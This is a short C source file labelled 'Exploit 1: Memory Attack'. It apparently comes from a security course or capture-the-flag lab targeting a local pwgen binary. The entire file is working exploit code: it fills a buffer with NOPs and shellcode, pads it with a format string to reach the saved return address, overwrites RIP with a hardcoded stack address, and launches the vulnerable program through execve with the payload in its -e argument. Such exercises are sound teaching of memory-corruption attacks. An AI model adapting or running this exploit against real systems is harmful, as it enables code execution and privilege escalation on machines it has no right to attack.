// Exploit 1: Memory Attack
#include "shellcode.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define FILENAME_SIZE 1024
#define BUFFER_OVERFLOW_OFFSET 0x418
#define BUFFUR_ADDR 0x7fffffffe460
#define NOP_OPCODE 0x90
#define NOP_PREFIX 16

int main() {
  char exploit[FILENAME_SIZE];
  char *args[] = {"/usr/local/bin/pwgen", NULL, NULL};
  char *env[] = {NULL};

  // Fill the buffer with NOPs
  memset(exploit, NOP_OPCODE, FILENAME_SIZE);

  // Copy the shellcode into the buffer
  memcpy((char *)(exploit + NOP_PREFIX), shellcode, sizeof(shellcode) - 1);
  int written = NOP_PREFIX * 2 + sizeof(shellcode);

  // Append format string that will fill the rest of the buffer
  char format_exploit[FILENAME_SIZE - written];
  snprintf(format_exploit, FILENAME_SIZE - written, "%%%dd",
           BUFFER_OVERFLOW_OFFSET - written);
  strncpy((char *)(exploit + written), format_exploit, strlen(format_exploit));
  written += strlen(format_exploit);

  // Overwrite RIP with the address of the buffer
  *(void **)(exploit + written) = (void *)BUFFUR_ADDR;

  // Add the seed flag with expliot filename to the argument list
  char seed_flag[2 + FILENAME_SIZE];
  snprintf(seed_flag, 2 + FILENAME_SIZE, "-e%s", exploit);
  args[1] = seed_flag;

  // Execute the vulnerable program
  execve(args[0], args, env);
  perror("execve");
  exit(EXIT_FAILURE);
}
